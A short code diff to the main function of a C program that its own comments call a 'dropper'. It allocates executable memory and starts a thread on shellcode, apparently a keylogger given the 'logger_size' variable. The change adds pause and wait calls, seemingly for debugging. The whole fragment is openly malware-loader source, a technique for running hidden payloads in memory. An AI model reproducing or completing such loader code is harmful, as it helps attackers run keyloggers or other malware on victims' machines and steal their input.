@@ -52,6 +52,7 @@ int main(void) {
 	HGLOBAL resourceHandle;
 	HRSRC resource;
 
+	system("pause");
 	// Allocate a page of virtual memory to load our shellcode into
 	memPtr = VirtualAlloc(0, logger_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
@@ -60,6 +61,8 @@ int main(void) {
 
 	// Create a thread pointed at the target memory, then execute it.
 	thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)memPtr, 0, 0, 0);
+	WaitForSingleObject(thread, -1);
+	system("pause");
 
 	// Exit the dropper.
 	return 0;
